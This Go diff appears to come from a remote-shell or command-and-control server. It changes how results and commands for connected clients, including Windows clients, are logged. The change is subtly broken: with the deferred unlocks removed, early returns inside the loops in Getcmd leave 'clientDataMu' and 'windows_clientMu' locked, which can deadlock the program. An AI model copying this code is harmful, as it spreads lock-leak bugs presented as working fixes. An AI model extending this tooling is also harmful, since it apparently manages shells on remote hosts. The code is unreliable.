@@ -2366,7 +2366,6 @@ func Results(uid, results, Taskid string,code_map map[byte]int) {
     // 日志记录
     var shellname string
     clientDataMu.RLock()
-    defer clientDataMu.RUnlock()
     for i := range client_data.Clients {
         client := &client_data.Clients[i]
         if uid == client.Uid {
@@ -2374,6 +2373,16 @@ func Results(uid, results, Taskid string,code_map map[byte]int) {
             break
         }
     }
+	clientDataMu.RUnlock()
+	windows_clientMu.Lock()
+	for i := range windows_client_data.Clients {
+		client := &windows_client_data.Clients[i]
+		if uid == client.Uid {
+			shellname = client.Host
+			break
+		}
+	}
+	windows_clientMu.Unlock()
     log_str := fmt.Sprintf(log_word["result"], shellname, uid, len(results))
     logger.WriteLog(log_str)
 }
@@ -2628,7 +2637,6 @@ func Getcmd(uid, cmd, Taskid string) string {
 
             go func(uid string) {
                 clientDataMu.RLock()
-                defer clientDataMu.RUnlock()
                 for i := range client_data.Clients {
                     client := &client_data.Clients[i]
                     if uid == client.Uid {
@@ -2637,6 +2645,17 @@ func Getcmd(uid, cmd, Taskid string) string {
                         return
                     }
                 }
+				clientDataMu.RUnlock()
+				windows_clientMu.Lock()
+				for i := range windows_client_data.Clients {
+					client := &windows_client_data.Clients[i]
+					if uid == client.Uid {
+						log_str := fmt.Sprintf(log_word["msg"], client.Host, uid, cmd)
+						logger.WriteLog(log_str)
+						return
+					}
+				}
+				windows_clientMu.Unlock()
             }(uid)
         }
     }
